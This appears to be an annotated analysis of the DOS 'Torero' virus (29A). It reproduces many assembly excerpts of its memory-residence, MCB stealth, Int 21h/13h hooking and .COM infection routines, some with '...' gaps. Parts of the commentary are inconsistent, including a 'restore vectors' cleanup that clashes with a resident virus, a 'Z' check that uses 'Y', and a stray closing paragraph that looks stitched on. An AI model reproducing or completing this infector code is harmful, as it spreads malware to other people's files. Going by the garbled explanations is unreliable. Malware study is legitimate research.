## Analyses

1.  **Initialization and Memory Residence**:
    
    -   The virus loads itself into memory and checks if it's already resident.
    -   It modifies the Memory Control Block (MCB) to hide itself and adjust the available memory size.

```
torero_entry:   call    delta_offset                ; Get offset in BP
delta_offset:   pop     bp                          ; for later use
                sub     bp, offset delta_offset
                ...
                cmp     bx, ';)'                     ; Are we already resident?
                jne     set_int_21h                 ; If not, proceed to set interrupt 21h
```
2.  **System Interrupt Interception (Int 21h and Int 13h)**:
    
    -   The virus replaces the original interrupt vectors for Int 21h (DOS system calls) and Int 13h (low-level disk operations) with its own handlers.
    -   This allows it to intercept and control certain system operations.
```
; Setting new interrupt 21h
set_int_21h:    ...
                mov     word ptr [si-4], offset new_int_21h
                mov     word ptr [si-2], ax          ; Set our Int 21h

; Setting new interrupt 13h
                ...
                mov     word ptr [si-4], offset new_int_13h
                mov     word ptr [si-2], ax          ; Set our Int 13h

```
3.  **File Infection**:
    
    -   Upon file opening (via Int 21h, function 3Dh), the virus checks if the file is infected. If not, it infects it by appending its code.
    -   It also manipulates file attributes to hide its activity.
```
file_open:      call    infect_file                 ; Infection routine
                jmp     dword ptr cs:[old_int_21h]  ; Jump back to original Int 21h

infect_file:    ...
                mov     ax, 3d00h                    ; Open the file
                call    int_21h
                ...
                mov     ah, 40h                      ; Write the virus to the end of the file
                mov     cx, torero_size
                lea     dx, torero_start
                call    int_21h
                ...
                mov     ah, 40h                      ; Overwrite the file header to ensure virus execution
                mov     cx, 3
                lea     dx, com_header
                call    int_21h

```
4.  **Modification of Interrupt Vectors**:
    
    -   The virus modifies the interrupt vectors for system calls and disk operations, redirecting these calls to itself first.

5.  **Stealth Behavior**:
    
    -   The virus attempts to hide by modifying memory control block information and intercepting system calls to avoid detection.
6.  **Error Handling (Int 24h)**:
    
    -   The virus handles interrupt 24h, used for critical DOS errors, to prevent crashes or suspicious behavior.
7.  **Infection Routine**:
    
    -   This part of the code manages the infection of opened files by injecting the virus's code into them.
8.  **Virus Signature**:
    
    -   The virus includes a signature, likely used by its creator for identification.
```
signature       db      0dh,0ah,'[Torero Â€:-) by Mister Sandman/29A]',0dh,0ah

```
9.  **Cleanup and Closure**:
    
    -   After performing its actions, the virus restores the original interrupt vectors and performs cleanup before returning control to the system or host application.
```
; Hide in memory block
                mov     byte ptr ds:[di], 'Z'        ; Mark block as Z (hidden)

; Cleanup and restoring original interrupt vectors
                ...
                mov     word ptr [si-4], offset old_int_21h
                mov     word ptr [si-2], ax          ; Restore original Int 21h

```
### System Interrupt Interception

#### Interrupt 21h Setup

```
set_int_21h:    mov     ax,es
                dec     ax
                mov     ds,ax                       ; Set DS to the segment before ES
  ```

-   The virus adjusts the Data Segment (DS) register to point to a specific memory location, likely where it plans to store or retrieve data.

```
xor     di,di
                cmp     byte ptr ds:[di],'Y'        ; Check if it's a 'Z' MCB (Memory Control Block)
                jna     set_int_21h
```

-   It's checking the Memory Control Block (MCB) to find a specific block. This is part of how the virus finds a suitable place in memory.

```
sub     word ptr ds:[di+3],((torero_size/10h)+2)
                sub     word ptr ds:[di+12h],((torero_size/10h)+2)
```

-   The virus adjusts memory control blocks to make space for itself, effectively hiding in memory.

```
add     ax,word ptr ds:[di+3]
                inc     ax
                mov     ds,ax
                mov     byte ptr ds:[di],'Z'        ; Mark the block as 'Z', indicating it's used
                mov     word ptr ds:[di+1],8        ; Mark it as system memory
 ```

-   The virus marks a block of memory as a 'Z' block, which is a common technique used by viruses to hide from memory management utilities.

```
mov     word ptr ds:[di+3],((torero_size/10h)+1)
                mov     word ptr ds:[di+8],4f44h    ; Mark block as owned by DOS
                mov     word ptr ds:[di+0ah],0053h
                inc     ax
```

-   Further manipulation of the Memory Control Block to conceal the virus's presence in memory.

#### Copying Virus to Memory

```
cld
                push    cs
                pop     ds
                mov     es,ax
                mov     cx,torero_size              ; Set CX to the size of the virus
                mov     si,bp
                rep     movsb                       ; Copy the virus to the allocated memory
```

-   This part copies the virus code to the newly allocated memory space. The `rep movsb` instruction is used for the actual copying, moving `torero_size` bytes of data.

#### Setting New Interrupt Vectors

```
push    es
                push    offset copy_vector          ; Set up return address to 'copy_vector'
                retf                                ; Far return to 'copy_vector'
```

-   The virus sets up a far return to a label `copy_vector`. This is part of the virus's control flow redirection.

### Intercepting Interrupt 13h

The code likely contains similar steps for setting up an interception for Interrupt 13h, which deals with low-level disk operations. This allows the virus to monitor, and potentially interfere with, disk reads and writes, which is a common way for it to spread itself to other files or disks.

### Summary

This section of the virus is about establishing control over critical system functions by intercepting interrupts. By doing so, the virus can insert its code into regular system operations, thereby ensuring it remains active and can spread. The technical nature of these operations shows a deep understanding of DOS internals and assembly language programming.

## Infection routine

This routine is called when the virus detects a file opening operation via DOS interrupt 21h.

### Infection Routine Detailed Analysis

#### Setup and Opening the File

```
infect_file:    pushf                              ; Save flag register on stack
                push    ax bx cx dx                 ; Save registers
                push    si di ds es                 ; Save index and segment registers

                call    set_int_24h                 ; Set interrupt 24h (critical error handler)

                cmp     ah,6ch                      ; Check if extended open (DOS 4.0+)
                jne     normal_open

                mov     dx,si                       ; If extended open, fix register values
normal_open:    mov     ax,3d00h                    ; Open file (handle in AL)
                call    int_21h                     ; Call DOS interrupt 21h to open file
                xchg    bx,ax                       ; Exchange AX and BX (file handle to BX)
```
#### Getting File's SFT and Checking for Previous Infection

```
push    cs                          ; Push CS onto stack
                pop     ds                          ; Set DS = CS

                call    get_sft                     ; Get file's System File Table (SFT)
                call    check_mark                  ; Check if file already infected
                jae     close_and_pop               ; Jump if file already infected or error
```

#### Preparing the File for Infection

```
mov     byte ptr es:[di+2],2        ; Set file open mode to read/write
                mov     ax,word ptr es:[di+28h]     ; Get file extension
                cmp     ax,'OC'                     ; Check if file is .COM
                jne     close_and_pop               ; If not .COM, don't infect

                mov     byte ptr cs:[infecting],1   ; Set infection flag
                mov     ah,3fh                      ; Prepare to read file
                mov     cx,3                        ; Read first 3 bytes (to check file header)
                lea     dx,header_store             ; Temporary storage for file header
                call    int_21h                     ; Read file header
```

#### Appending Virus to the File

```
mov     ax,word ptr es:[di+11h]     ; Get file length
                cmp     ax,0ea60h                   ; Check if file is too large
                ja      close_and_pop               ; If too large, don't infect

                push    ax                          ; Save file length
                call    lseek_end                   ; Move file pointer to the end

                mov     ah,40h                      ; Prepare to write to file
                mov     cx,torero_size              ; Size of virus code
                lea     dx,torero_start             ; Start of virus code in memory
                call    int_21h                     ; Append virus to file
```

#### Writing New Entry Point to File Header

```
pop     ax                          ; Retrieve file length
                sub     ax,3                        ; Adjust for new entry point
                mov     word ptr cs:[com_header+1],ax  ; Update COM header for virus entry point
                call    set_marker                  ; Mark file as infected

                call    lseek_start                 ; Move file pointer to start
                mov     ah,40h                      ; Set up to write file
                mov     cx,3                        ; Size of new header to write
                lea     dx,com_header               ; New header to write
                call    int_21h                     ; Write new header to file
``` 

#### Cleanup and Finalization

```
mov     ax,word ptr es:[di+11h]     ; Get actual file size
                sub     ax,3                        ; Adjust for header size
                call    lseek_end                   ; Move file pointer to header position

                mov     ah,40h                      ; Set up to write file
                mov     cx,3                        ; Size of data to overwrite
                lea     dx,garbage                  ; Data to overwrite with
                call    int_21h                     ; Overwrite part of the file (for stealth)

close_and_pop:  mov     ah,3eh                      ; Close file function
                call    int_21h                     ; Close the file

                call    reset_int_24h               ; Reset interrupt 24h (critical error handler)

                pop
 ```


Let's delve into the part of the code where the virus intercepts system interrupts, specifically DOS Interrupt 21h (Int 21h) and Interrupt 13h (Int 13h). This is a critical part of the virus's functionality, allowing it to inject its behavior into system operations.
